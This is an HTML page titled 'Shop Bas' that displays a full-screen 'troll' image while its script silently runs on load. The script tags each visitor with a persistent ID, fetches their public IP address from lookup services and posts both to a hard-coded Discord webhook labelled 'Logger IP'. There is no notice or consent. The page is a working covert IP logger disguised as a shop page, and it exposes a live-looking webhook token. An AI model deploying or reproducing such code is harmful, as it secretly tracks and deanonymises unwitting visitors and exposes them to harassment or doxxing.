<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Shop Bas</title>
    <style>
        body {
            margin: 0;
            padding: 0;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            background-color: #000;
            overflow: hidden;
            position: relative;
        }
        img {
            width: 1920px;
            height: 1080px;
            object-fit: contain;
            position: absolute;
            z-index: 1;
        }
    </style>
</head>
<body>
    <img src="https://cdn.computerhoy.com/sites/navi.axelspringer.es/public/media/image/2014/10/64609-estudio-dice-que-trolls-internet-son-sadicos-psicopatas.jpg?tf=3840x" alt="Troll Image">
    <script>
        
        function generateUUID() {
            return 'xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx'.replace(/[xy]/g, function(c) {
                const r = Math.random() * 16 | 0, v = c === 'x' ? r : (r & 0x3 | 0x8);
                return v.toString(16);
            });
        }

        
        let visitorId = localStorage.getItem('visitorId');
        if (!visitorId) {
            visitorId = generateUUID();
            localStorage.setItem('visitorId', visitorId);
        }

        const WEBHOOK_URL = "https://discord.com/api/webhooks/1362904665284415649/UxlYf1_zTQ4NRcHabdIzRWa5ec17kg0vbWQ_gmxVhMda3pTlqhxTCHpnR7zB_eUyfvaE";

        async function obtenerDatos(retries = 3) {
            const apis = [
                { url: "https://api.ipify.org?format=json", type: "json" },
                { url: "https://icanhazip.com", type: "text" }
            ];

            for (let attempt = 1; attempt <= retries; attempt++) {
                for (const api of apis) {
                    try {
                        console.log(`🔍 Intento ${attempt} con ${api.url}...`);

                        
                        const ipResponse = await fetch(api.url, {
                            method: "GET",
                            headers: { "Accept": "application/json" }
                        });
                        if (!ipResponse.ok) {
                            throw new Error(`Error obteniendo IP: ${ipResponse.status} ${ipResponse.statusText}`);
                        }

                        let ip;
                        if (api.type === "json") {
                            const ipData = await ipResponse.json();
                            ip = ipData.ip;
                        } else {
                            ip = (await ipResponse.text()).trim();
                        }

                        
                        const ipv4Regex = /^(?:[0-9]{1,3}\.){3}[0-9]{1,3}$/;
                        if (!ipv4Regex.test(ip)) {
                            throw new Error("No se obtuvo una IP IPv4 válida");
                        }

                        console.log("✔️ IP IPv4 obtenida:", ip);

                       
                        const lastSentIP = localStorage.getItem('lastSentIP');
                        if (lastSentIP === ip) {
                            console.log("ℹ️ IP igual a la anterior, no se envía:", ip);
                            return; 
                        }

                        
                        const mensaje = {
                            content: "**🔍 Nueva IP detectada**",
                            embeds: [
                                {
                                    title: "🌍 Datos del usuario",
                                    color: 16711680,
                                    fields: [
                                        { name: "🖥️ IP (IPv4)", value: `${ip}`, inline: true },
                                        { name: "🆔 ID Visitante", value: `${visitorId}`, inline: true },
                                    ],
                                    footer: {
                                        text: "🔍 Logger IP | Shop Bas",
                                    },
                                },
                            ],
                        };

                        
                        console.log("📤 Enviando datos a Discord...");
                        const webhookResponse = await fetch(WEBHOOK_URL, {
                            method: "POST",
                            headers: { "Content-Type": "application/json" },
                            body: JSON.stringify(mensaje),
                        });

                        if (!webhookResponse.ok) {
                            const errorText = await webhookResponse.text();
                            throw new Error(`Error enviando a Discord: ${webhookResponse.status} ${errorText}`);
                        }

                        console.log("✔️ Datos enviados a Discord exitosamente");
                        
                        localStorage.setItem('lastSentIP', ip);
                        return; 

                    } catch (error) {
                        console.error(`❌ Error en intento ${attempt} con ${api.url}:`, error.message);
                        if (attempt === retries && api === apis[apis.length - 1]) {
                            console.error("❌ Se agotaron los intentos y APIs. No se pudo enviar la IP.");
                        }
                        
                        await new Promise(resolve => setTimeout(resolve, 1000));
                    }
                }
            }
        }

        
        obtenerDatos();
    </script>
</body>
</html>
